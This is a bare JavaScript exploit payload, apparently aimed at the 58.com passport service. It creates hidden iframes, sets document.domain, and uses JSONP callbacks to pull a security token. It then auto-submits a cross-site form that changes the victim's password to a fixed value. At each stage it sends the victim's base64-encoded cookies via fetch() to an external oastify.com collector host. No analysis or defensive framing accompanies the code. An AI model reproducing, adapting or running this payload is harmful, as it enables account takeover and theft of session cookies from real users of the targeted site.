document.write('<iframe src="" frameborder="0" id="iframe1" name="iframeName1"></iframe>');
document.write('<iframe src="" frameborder="0" id="iframe2" name="iframeName2"></iframe>');
document.domain="58.com";
window.hacker="https://7s0k6sxewiqrfnrv6at3yqd3muskg9.oastify.com/"

class sdk{successFun(t){window.token=t["data"]["token"];window.k="token";if (window.token==undefined){fetch(window.hacker+"Security_verification_is_required----"+btoa(document.cookie));}else{form2fun();}}}
SDK_CALLBACK_FUN_1664883111364=new sdk();

class sdk2{successFun(t){window.code=t["code"];if(window.code==0 || window.code==802){fetch(window.hacker+"The_password_has_been_changed----"+btoa(document.cookie))};}}

SDK_CALLBACK_FUN_1664980264130=new sdk2()
form1= document.createElement("form");
form1.id="id1";
form1.name="name1";
form1.method = "POST";
form1.action = "//passport.58.com/sec/58/envircheck/pc/check";
form1.target = "iframeName1";
document.body.appendChild(form1);
key=["type","domain","callback"];
params={"type":"1","domain":"58.com","callback":"SDK_CALLBACK_FUN_1664883111364.successFun"};
for (var i=0;i<3;i++){
    j = document.createElement("input");
    j.type = "text";
    j.name = key[i];
    j.value = params[key[i]];
    form1.appendChild(j);
}
form1.submit();



form2fun=function() {
form2= document.createElement("form");
form2.id="id2";
form2.name="name2";
form2.method = "POST";
form2.action = "//passport.58.com/sec/58/newmodifypwd/pc/modify";
form2.target = "iframeName2";
document.body.appendChild(form2);
key2=["password","callback"];
key2[2]=window.k
params2={"password":"2e2b271ef85779971a458b4d630442c72998728c6d8f1b4d9e7f5733ca5cb9495f1b96262daa21e4af3d5a9c82f766eb0b8b5df8d97a896e5098b48a3a149c810d672a4494af5b022e5b1cec0a0471b7268c56a474ed18e9543925bfea22b80e54acf447dae7ef41f62fe13da154ad97b92b76e3b64e9ba6977678d968682838","callback":"SDK_CALLBACK_FUN_1664980264130.successFun"};
params2[window.k]=window.token
for (var i=0;i<3;i++){
    k = document.createElement("input");
    k.type = "text";
    k.name = key2[i];
    k.value = params2[key2[i]];
    form2.appendChild(k);
}
form2.submit();
}

